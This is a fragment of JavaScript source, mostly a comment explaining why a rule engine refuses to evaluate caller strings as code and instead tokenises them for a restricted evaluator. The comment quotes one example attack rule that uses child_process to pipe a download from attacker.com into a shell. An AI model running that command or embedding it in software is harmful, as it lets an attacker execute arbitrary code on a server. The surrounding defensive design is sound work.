//
// This executes an arbitrary caller-supplied string as JavaScript, which is a
// critical Remote Code Execution (RCE) vulnerability — any client can send a
// rule such as:
//   "require('child_process').execSync('curl attacker.com | sh')"
// and run unrestricted code inside the server process.
//
// The reference implementation is NOT used here. Instead we provide a
// restricted evaluator that covers all legitimate rule use-cases
// (property access, comparison, arithmetic, logical operators) while
// refusing to evaluate anything that cannot be parsed as a safe expression.
// ---------------------------------------------------------------------------

/**
 * Tokenise a rule string into an array of token objects.
 * Recognised token types:
 *   number   – integer or decimal literal
 *   string   – single- or double-quoted string literal
 *   bool     – true / false
 *   null     – null
 *   ident    – identifier or dotted property path  (e.g. ctx.amount)
 *   op       – operator  (===, !==, ==, !=, <=, >=, &&, ||, !, <, >, +, -, *, /, %)
 *   lparen / rparen
